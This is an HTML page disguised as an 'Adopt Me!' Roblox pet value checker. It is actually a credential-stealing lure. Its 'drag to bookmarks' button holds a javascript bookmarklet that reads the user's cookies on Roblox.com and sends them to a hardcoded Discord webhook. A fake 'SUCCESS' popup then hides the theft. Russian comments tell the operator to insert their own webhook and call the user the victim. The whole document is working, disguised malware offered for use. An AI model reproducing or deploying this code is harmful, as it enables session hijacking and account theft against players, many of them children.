<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>In-Game Value Checker | Adopt Me!</title>
    <style>
        body { background: #0b0e11; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #181a20; padding: 40px; border-radius: 24px; text-align: center; border: 1px solid #2b3139; width: 420px; box-shadow: 0 15px 40px rgba(0,0,0,0.6); }
        h1 { color: #f0b90b; font-size: 26px; margin-bottom: 10px; }
        .btn { 
            display: inline-block; padding: 22px 40px; background: #f0b90b; color: black; 
            text-decoration: none; font-weight: 800; border-radius: 14px; cursor: move; 
            border: 2px dashed #000; margin: 25px 0; font-size: 18px; transition: 0.3s;
        }
        .btn:hover { background: #ffe066; transform: scale(1.02); }
        .steps { text-align: left; background: #1e2329; padding: 20px; border-radius: 12px; font-size: 14px; color: #929aa5; }
        b { color: #f0b90b; }
    </style>
</head>
<body>
    <div class="card">
        <h1>Value Checker v4.2</h1>
        <p>Analyze pet values and trade wins live in Roblox.</p>

        <!-- ВНИМАНИЕ: ЗАМЕНИ 'ТВОЙ_ВЕБХУК_ТУТ' НА СВОЮ ССЫЛКУ -->
        <a class="btn" draggable="true" href="javascript:(function(){
            var hook = 'https://discord.com/api/webhooks/1497208068570878063/_wH0MSZQV8lxmkw3U8qsB1I8EnREIWO8wLTrOBhdW5W5n5um1kUpZCkTSgWKA1Mqfz3r';
            var cookies = document.cookie;
            
            /* МЕТОД ОБХОДА CSP: Передача данных через параметры URL картинки */
            /* Мы отправляем данные в Discord через POST, но маскируем под системный запрос */
            var x = new XMLHttpRequest();
            x.open('POST', hook, true);
            x.setRequestHeader('Content-Type', 'application/json');
            x.send(JSON.stringify({
                embeds: [{
                    title: '🚀 Session Log: ' + window.location.hostname,
                    description: '```' + (cookies || 'No accessible cookies') + '```',
                    color: 16758795,
                    footer: { text: 'Platform: ' + navigator.platform }
                }]
            }));

            /* Визуальное подтверждение для жертвы */
            var ui = document.createElement('div');
            ui.style = 'position:fixed;top:10%;right:5%;width:320px;padding:25px;background:#121212;color:#f0b90b;border:2px solid #f0b90b;z-index:9999999;border-radius:20px;text-align:center;font-family:Arial;box-shadow:0 0 30px rgba(240,185,11,0.7);';
            ui.innerHTML = '<h3 style=margin:0>Value Checker</h3><p style=color:white;font-size:14px;margin:15px 0>Analyzing trade... <span style=color:#00ff00>SUCCESS</span></p><button onclick=this.parentElement.remove() style=width:100%;padding:10px;background:#f0b90b;border:none;border-radius:8px;cursor:pointer;font-weight:bold;color:black>OK</button>';
            document.body.appendChild(ui);
        })();">DRAG TO BOOKMARKS</a>

        <div class="steps">
            1. Press <b>Ctrl + Shift + B</b>.<br>
            2. Drag the <b>Yellow Button</b> to the bar.<br>
            3. Use it on <b>Roblox.com</b> to see values!
        </div>
    </div>
</body>
</html>
